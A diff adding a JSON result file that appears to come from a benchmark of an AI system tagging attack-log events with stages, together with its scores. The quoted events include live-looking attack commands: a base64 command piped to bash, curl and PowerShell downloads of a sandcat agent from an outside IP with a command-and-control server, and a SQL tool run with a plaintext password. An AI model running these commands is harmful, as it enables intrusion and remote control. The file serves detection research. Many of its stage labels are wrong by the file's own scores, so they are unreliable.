@@ -1,0 +1,114 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "ssh -c which ps",
+        "stage": "Discovery"
+      },
+      {
+        "command": "ps -ax -o pid=,ppid=,pcpu=,pmem=,command=",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cpuUsage.sh /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh 294687 294943 295048 294944 295049",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cpuUsage.sh /root/.vscode-server/bin/ccbaa2d27e38e5afa3e5c21c1c7bef4657064247/out/vs/base/node/cpuUsage.sh 296059",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "base64 -d",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "bash",
+        "stage": "Execution"
+      },
+      {
+        "command": "bash -c echo d2hvYW1pJmlmY29uZmlnJmFycCAtYSZwaW5nIC1jIDEgMTAuNjcuMjAwLjIwMA== | base64 -d|bash",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "curl -O http://124.223.85.207:8079/sandcat-linux",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "chmod +x sandcat-linux",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "./sandcat-linux -server https://124.223.85.207:8443 -opid 9f726796-b4f3-463f-8cfd-4f1498314252 -v",
+        "stage": "Collection"
+      },
+      {
+        "command": "./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --enable && ./sqltool_amd64_upx --server 192.168.0.244 --user sa --password Sa123456 --exec whoami",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd /c powershell.exe -ExecutionPolicy Bypass -C $ip=\"https://124.223.85.207:8443\";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$url=$ip+\"/file/download\";$wc=New-Object System.Net.WebClient;$wc.Headers.add(\"company_code\",1234567);$wc.Headers.add(\"platform\",\"windows\");$wc.Headers.add(\"file\",\"sandcat.go\"); $output=\"C:\\Users\\Public\\sandcat.exe\";$wc.DownloadFile($url,$output);cmd /c start /min C:\\Users\\Public\\sandcat.exe -opid 9f726796-b4f3-463f-8cfd-4f1498314252...",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "del /f /usr/tomcat/apache-tomcat-8.5.76//webapps/ROOT/logout.txt",
+        "stage": "Persistence"
+      },
+      {
+        "command": "del /f /q c:\\windows\\logout.jsp",
+        "stage": "Persistence"
+      },
+      {
+        "command": "http-nio-80-exe -Djava.util.logging.config.file=/usr/tomcat/apache-tomcat-8.5.76/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/tomcat/apache-tomcat-8.5.76/bin/bootstrap.jar:/usr/tomcat/apache-t...[truncated]",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "This is an attack using multiple tools to gain access to the system, execute commands, and communicate with a remote server. The attackers use base64 encoded strings as initial payload, then install malware like sandcat-linux and sqltool_amd64_upx. They also generate backdoors for persistence. Furthermore, they create new malicious processes such as http-nio-80-exe which could be used as an additional communication channel.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 80394,
+      "completion_tokens": 2067,
+      "total_tokens": 82461,
+      "wall_clock_s": 17.105,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.375,
+      "recall": 0.6,
+      "f1": 0.4615384615384615,
+      "tp": 6,
+      "fp": 10,
+      "fn": 4
+    },
+    "stage": {
+      "precision": 0.125,
+      "recall": 0.25,
+      "f1": 0.16666666666666666,
+      "tp": 2,
+      "fp": 14,
+      "fn": 6,
+      "recall_partial": 0.2857142857142857
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 80394,
+      "completion_tokens": 2067,
+      "total_tokens": 82461,
+      "wall_clock_s": 17.105,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
